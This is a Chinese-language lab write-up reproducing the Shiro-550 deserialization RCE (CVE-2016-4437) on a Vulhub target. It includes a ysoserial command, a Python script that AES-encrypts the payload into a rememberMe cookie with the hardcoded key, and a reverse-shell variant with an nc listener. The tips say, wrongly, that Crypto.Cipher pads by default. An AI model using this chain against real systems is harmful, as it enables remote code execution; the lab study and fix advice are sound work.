# Shiro-550 反序列化 RCE 复现（CVE-2016-4437）

> 我自己实操的笔记，写得比较啰嗦，但该有的步骤和坑都记了。

---

## 漏洞原理（通俗版）

Shiro 1.2.4 及以前，`rememberMe` 功能默认用了一个写死的 AES 密钥（`kPH+bIxk5D2deZiIxcaaaA==`）。  
攻击者可以拿这个密钥自己构造恶意序列化对象，加密成 Cookie 发过去，服务端解密反序列化，直接就执行命令了。  
说白了就是“密钥硬编码 + 反序列化”组合拳。

---

## 我的环境

- 攻击机：Kali（IP 随意）  
- 靶机：Vulhub 的 shiro 1.2.4，地址 `http://192.168.1.81:8080`（你按自己实际改）  
- 工具：Burp Suite、ysoserial、自己写的 Python 加密脚本

---

## 复现过程（一步一步）

### 1. 启动靶场

```bash
cd vulhub/shiro/CVE-2016-4437
docker-compose up -d
https://./screenshots/docker-up.png

2. 确认漏洞存在
浏览器访问靶机登录页，抓包看响应头有没有 Set-Cookie: rememberMe=deleteMe。
有就说明开启了 rememberMe，可以搞。

https://./screenshots/burp-cookie.png

3. 生成恶意 payload
用 ysoserial 生成执行 id 命令的序列化文件：

bash
java -jar ysoserial-all.jar CommonsCollections2 "id" > payload.ser
踩坑：我一开始用 CommonsCollections1 没反应，换成 2 才行，估计是依赖版本问题。

4. 加密 payload 得到 Cookie 值
Shiro 的 Cookie 是 AES 加密（CBC，IV全零）后再 Base64。
我写了个 Python 脚本 encrypt.py：

python
import base64
from Crypto.Cipher import AES

key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")

def encrypt(data):
    iv = b'\x00' * 16
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pad = 16 - len(data) % 16
    data += bytes([pad]) * pad
    return base64.b64encode(cipher.encrypt(data)).decode()

with open("payload.ser", "rb") as f:
    raw = f.read()
cookie = encrypt(raw)
print(cookie)
运行 python3 encrypt.py，得到一串 Base64，复制。

https://./screenshots/encrypt-run.png

5. 发送恶意 Cookie
在 Burp 里随便抓个 GET 请求，把 Cookie 改成：

text
rememberMe=刚才复制的Base64
发送。

https://./screenshots/burp-send.png

6. 查看结果
如果成功，响应里会显示 id 的执行结果（我这边直接看到 uid=0(root)）。
反弹 shell 的话，把命令换成 bash -c {echo,<base64编码的命令>}|{base64,-d}|bash，攻击机 nc -lvnp 4444 就能收到。

https://./screenshots/result.png

我踩过的坑（记录一下）
加密填充必须用 PKCS7，Python 的 Crypto.Cipher 默认就是这个，别搞错。

Burp 可能会自动 URL 编码 Cookie，记得关掉或手动改回原样。

如果没反应，试试其他 Commons 链，或者检查靶机是否真的用了默认密钥。

修复建议（给自己备忘）
升级 Shiro 到 1.2.5+。

如果没法升，一定要改默认密钥，随机生成。

业务允许的话直接禁用 rememberMe。
